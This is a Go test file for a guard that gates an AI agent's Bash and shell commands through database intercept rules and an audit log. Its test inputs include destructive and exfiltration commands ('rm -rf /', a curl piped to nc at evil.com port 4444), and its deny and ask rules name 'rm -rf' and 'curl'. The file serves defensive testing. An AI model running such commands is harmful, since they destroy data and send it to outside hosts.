package guard

import (
	"context"
	"database/sql"
	"database/sql/driver"
	"encoding/json"
	"errors"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/RC-CHN/ARTEX/db"
	"github.com/RC-CHN/ARTEX/intercept"
	"github.com/RC-CHN/ARTEX/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

type guardStubConnector struct {
	rules []db.InterceptRule
}

func (c *guardStubConnector) Connect(context.Context) (driver.Conn, error) {
	return &guardStubConn{rules: c.rules}, nil
}
func (c *guardStubConnector) Driver() driver.Driver { return guardStubDriver{} }

type guardStubDriver struct{}

func (guardStubDriver) Open(string) (driver.Conn, error) { return nil, errors.New("unused") }

type guardStubConn struct{ rules []db.InterceptRule }

func (c *guardStubConn) Prepare(string) (driver.Stmt, error) { return nil, errors.New("unused") }
func (c *guardStubConn) Close() error                        { return nil }
func (c *guardStubConn) Begin() (driver.Tx, error)           { return nil, errors.New("unused") }

func (c *guardStubConn) QueryContext(_ context.Context, query string, _ []driver.NamedValue) (driver.Rows, error) {
	switch {
	case strings.Contains(query, "FROM intercept_rules"):
		rows := make([][]driver.Value, 0, len(c.rules))
		for _, r := range c.rules {
			rows = append(rows, []driver.Value{
				r.ID, r.Name, r.Enabled, int64(r.Priority),
				r.MatchTarget, r.MatchType, r.Pattern, r.Action, r.Message,
				r.TimeoutEnabled, int64(r.TimeoutSeconds), r.TimeoutAction,
				r.CreatedAt, r.UpdatedAt,
			})
		}
		return &guardStubRows{
			cols: []string{"id", "name", "enabled", "priority", "match_target", "match_type", "pattern", "action", "message", "timeout_enabled", "timeout_seconds", "timeout_action", "created_at", "updated_at"},
			data: rows,
		}, nil
	case strings.Contains(query, "FROM settings"):
		return &guardStubRows{cols: []string{"value"}}, nil
	case strings.Contains(query, "INSERT INTO intercept_pending"):
		return &guardStubRows{cols: []string{"id"}, data: [][]driver.Value{{int64(1)}}}, nil
	default:
		return &guardStubRows{cols: []string{"ok"}}, nil
	}
}

type guardStubRows struct {
	cols []string
	data [][]driver.Value
	idx  int
}

func (r *guardStubRows) Columns() []string { return r.cols }
func (r *guardStubRows) Close() error      { return nil }
func (r *guardStubRows) Next(dest []driver.Value) error {
	if r.idx >= len(r.data) {
		return io.EOF
	}
	copy(dest, r.data[r.idx])
	r.idx++
	return nil
}

func TestPreToolUseInterceptBlockProducesSingleAuditEntryWithCommand(t *testing.T) {
	now := time.Now()
	sqlDB := sql.OpenDB(&guardStubConnector{
		rules: []db.InterceptRule{
			{
				ID: 1, Name: "block-rm", Enabled: true, Priority: 100,
				MatchTarget: "tool_input", MatchType: "contains", Pattern: "rm -rf",
				Action: "deny", Message: "禁止删除", CreatedAt: now, UpdatedAt: now,
			},
			{
				ID: 2, Name: "ask-curl", Enabled: true, Priority: 50,
				MatchTarget: "tool_input", MatchType: "contains", Pattern: "curl",
				Action: "ask", Message: "需要审批", CreatedAt: now, UpdatedAt: now,
			},
		},
	})
	defer sqlDB.Close()

	ic := intercept.New(&db.DB{DB: sqlDB})
	g := NewWithInterceptor(ic)

	// 1. Denied Bash call must record a single "block" entry with the actual command (never "allow" + empty "block").
	denyCmd := "rm -rf /tmp/evil"
	denyIn, _ := json.Marshal(map[string]string{"command": denyCmd})
	blocked, msg, err := g.Hooks().PreToolUse(context.Background(), "Bash", denyIn)
	if err != nil {
		t.Fatalf("PreToolUse err: %v", err)
	}
	if !blocked || !strings.Contains(msg, "禁止删除") {
		t.Fatalf("expected deny block, got blocked=%v msg=%q", blocked, msg)
	}
	audit := g.Audit()
	if len(audit) != 1 {
		t.Fatalf("expected 1 audit entry for blocked call, got %d: %+v", len(audit), audit)
	}
	if audit[0].Action != "block" || audit[0].Tool != "Bash" || audit[0].Command != denyCmd || audit[0].Reason == "" {
		t.Fatalf("unexpected block audit entry: %+v", audit[0])
	}

	// 2. Ask rule with already-cancelled context must also record a single "block" entry carrying shell_send text.
	cancelCtx, cancel := context.WithCancel(context.Background())
	cancel()
	sendCmd := "curl http://internal.example/"
	sendIn, _ := json.Marshal(map[string]string{"text": sendCmd})
	blocked, _, err = g.Hooks().PreToolUse(cancelCtx, "shell_send", sendIn)
	if err != nil {
		t.Fatalf("PreToolUse cancelled err: %v", err)
	}
	if !blocked {
		t.Fatal("expected cancelled ask call to block")
	}
	audit = g.Audit()
	if len(audit) != 2 {
		t.Fatalf("expected 2 total audit entries, got %d: %+v", len(audit), audit)
	}
	if audit[1].Action != "block" || audit[1].Tool != "shell_send" || audit[1].Command != sendCmd {
		t.Fatalf("unexpected cancelled-ask audit entry: %+v", audit[1])
	}

	// 3. Non-matching Bash call is allowed and records a single "allow" entry with command.
	okCmd := "ls -la"
	okIn, _ := json.Marshal(map[string]string{"command": okCmd})
	blocked, _, err = g.Hooks().PreToolUse(context.Background(), "Bash", okIn)
	if err != nil {
		t.Fatalf("PreToolUse allow err: %v", err)
	}
	if blocked {
		t.Fatal("expected benign command to be allowed")
	}
	audit = g.Audit()
	if len(audit) != 3 {
		t.Fatalf("expected 3 total audit entries, got %d: %+v", len(audit), audit)
	}
	if audit[2].Action != "allow" || audit[2].Tool != "Bash" || audit[2].Command != okCmd {
		t.Fatalf("unexpected allow audit entry: %+v", audit[2])
	}
}

var _ = hook.PreToolUse
